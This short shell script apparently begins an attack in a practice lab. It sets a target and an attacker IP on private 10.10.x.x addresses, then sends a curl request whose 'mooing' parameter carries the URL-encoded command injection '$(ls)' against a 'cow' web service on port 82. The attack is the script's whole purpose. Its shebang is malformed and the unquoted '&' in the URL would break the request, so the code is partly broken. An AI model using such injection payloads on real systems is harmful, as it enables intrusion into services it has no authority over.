#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null
curl -X GET http://10.10.210.85:82/?cow=default&mooing=%24%28ls%29